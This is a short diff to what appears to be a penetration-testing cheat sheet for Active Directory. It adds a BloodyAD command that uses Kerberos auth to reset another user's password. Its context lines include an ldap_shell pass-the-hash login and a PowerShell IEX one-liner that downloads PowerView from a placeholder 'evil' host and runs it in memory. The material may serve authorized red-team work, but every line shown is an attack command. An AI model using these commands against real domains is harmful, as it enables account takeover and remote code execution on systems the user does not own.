@@ -39,6 +39,12 @@ Ldap_shell -> `ldap_shell '<domain>/<user>:' -hashes fffffffffffffffffffffffffff
 
 <br>
 
+With KERBEROS auth:
+
+BloodyAD -> `bloodyAD -k --host <machine.domain> -d <domain> -u '<user>' -p '<password>' set password <target_user> '<new_password>'`
+
+<br>
+
 ### From Windows (internally):
 
 Load powerview -> `IEX (new-object net.webclient).downloadstring('http://<your_evil_ip_or_domain>/powerview.ps1')`
